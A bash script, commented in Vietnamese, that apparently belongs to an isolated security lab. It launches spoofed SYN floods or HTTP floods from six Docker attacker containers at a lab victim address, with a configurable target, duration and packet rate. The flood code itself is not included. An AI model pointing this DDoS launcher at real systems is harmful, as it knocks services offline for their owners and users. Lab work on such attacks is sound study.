#!/usr/bin/env bash
# Orchestrator DDoS (ban bash cua run_ddos.ps1) - chi dung trong lab co lap.
# Chay ca 6 attacker container dong loat nham victim cua lab.
#
# Cach dung:
#   ./run_ddos.sh syn                         # 6 attacker SYN flood (spoof) 30s
#   ./run_ddos.sh http                        # 6 attacker HTTP flood 30s
#   ./run_ddos.sh syn -t 172.30.0.10 -d 30    # chon target + thoi luong
#   ./run_ddos.sh syn -r 400                  # SYN co pacing 400 pps/nguon (0 = toi da)
#
# Ghi chu: neu user chua reload nhom docker trong phien dang nhap, script tu chay
# lai chinh no duoi "sg docker -c ..." (khong can sudo khi da la thanh vien nhom docker).
set -euo pipefail

# --- tu re-exec duoi nhom docker neu khong truy cap duoc daemon ---
if ! docker version >/dev/null 2>&1; then
  if id -nG "$(id -un)" | tr ' ' '\n' | grep -qx docker; then
    exec sg docker -c "$(printf '%q ' "$0" "$@")"
  fi
  echo "[!] Khong truy cap duoc Docker daemon va user khong o nhom 'docker'." >&2
  exit 1
fi

MODE="syn"
TARGET="172.30.0.10"
DURATION=30
PPS=""   # rong = khong truyen --pps (syn_flood tu hieu la toi da)

# tham so dau tien (neu co) la mode syn|http, giong run_ddos.ps1
if [[ "${1:-}" == "syn" || "${1:-}" == "http" ]]; then
  MODE="$1"; shift
fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)   TARGET="$2"; shift 2 ;;
    -d|--duration) DURATION="$2"; shift 2 ;;
    -r|--pps)      PPS="$2"; shift 2 ;;
    syn|http)      MODE="$1"; shift ;;
    *) echo "[!] Tham so la: $1" >&2; exit 2 ;;
  esac
done

ATTACKERS=(attacker1 attacker2 attacker3 attacker4 attacker5 attacker6)
echo "[*] Bat dau DDoS mode=$MODE tu ${#ATTACKERS[@]} nguon -> $TARGET trong ${DURATION}s"

pids=()
for a in "${ATTACKERS[@]}"; do
  if [[ "$MODE" == "syn" ]]; then
    # SYN flood: spoof IP, dung timeout de dung dung thoi luong
    cmd=(docker exec "$a" timeout "$DURATION" python3 /app/syn_flood.py "$TARGET" -p 80 --spoof)
    [[ -n "$PPS" ]] && cmd+=(--pps "$PPS")
  else
    # HTTP flood L7: tu dung sau -d giay
    cmd=(docker exec "$a" python3 /app/http_flood.py "$TARGET" -p 80 -t 20 -d "$DURATION")
  fi
  "${cmd[@]}" &
  pids+=($!)
done

echo "[*] Dang tan cong... (doi ${DURATION}s)"
# timeout gui SIGTERM -> syn_flood khong in tong; http_flood tu in req thanh cong.
wait "${pids[@]}" || true
echo "[*] DDoS ket thuc."
